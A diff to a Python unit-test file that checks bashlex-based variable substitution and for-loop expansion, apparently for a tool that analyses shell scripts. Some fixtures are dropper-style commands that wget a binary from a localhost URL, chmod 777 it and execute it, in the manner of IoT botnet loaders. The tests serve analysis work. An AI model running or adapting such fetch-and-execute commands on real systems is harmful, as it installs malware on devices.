@@ -45,10 +45,9 @@ class TestVariables(TestCase):
         result_strings = bashlex.parse('for a in "arm arm5 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\n do\n rm -rf arm\n wget http://127.0.0.1/words/arm -O\n chmod 777 arm\n ./arm ssh\n done') \
                             + bashlex.parse('for a in "arm arm5 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\n do\n rm -rf arm5\n wget http://127.0.0.1/words/arm5 -O\n chmod 777 arm5\n ./arm5 ssh\n done') \
                             + bashlex.parse('for a in "arm arm5 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\n do\n rm -rf aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n wget http://127.0.0.1/words/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -O\n chmod 777 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n ./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ssh\n done')
-        
+       
         replaced_nodes = substitute_variables(for_node, var_list)
         self.assertTrue(replaced_nodes == result_strings)
-        
         # Test that list nodes replaced and returned properly 
         nodes = bashlex.parse('n=1;a=2$n')
         result_nodes = bashlex.parse('n=1;a=21')
@@ -97,7 +96,7 @@ class TestVariables(TestCase):
         # Test for loops work with variable replacement
         for_node = bashlex.parse('for a in "$n"\n do\n echo something\n done')[0].list[0]
         new_var_list = update_var_list_with_for_loop(for_node, {'n':['one two three']})
-        self.assertTrue(new_var_list == {'n':['one two three'], 'a':['one two three']})
+        self.assertTrue(new_var_list == {'n':['one two three'], 'a':['one', 'two', 'three']})
         # Test for loops work with command substitution
         for_node = bashlex.parse('for a in "$(echo this)"\n do\n echo something\n done')[0].list[0]
         new_var_list = update_var_list_with_for_loop(for_node, {})
@@ -123,7 +122,7 @@ class TestVariables(TestCase):
         # Test for loops work with variable replacement
         for_node = bashlex.parse('for a in "$n"\n do\n echo something\n done')[0].list[0]
         new_var_list = update_var_list_with_for_loop(for_node, {'n':['one two three']})
-        self.assertTrue(new_var_list == {'n':['one two three'], 'a':['one two three']})
+        self.assertTrue(new_var_list == {'n':['one two three'], 'a':['one', 'two', 'three']})
         # Test for loops work with command substitution
         for_node = bashlex.parse('for a in "$(echo this)"\n do\n echo something\n done')[0].list[0]
         new_var_list = update_var_list_with_for_loop(for_node, {})
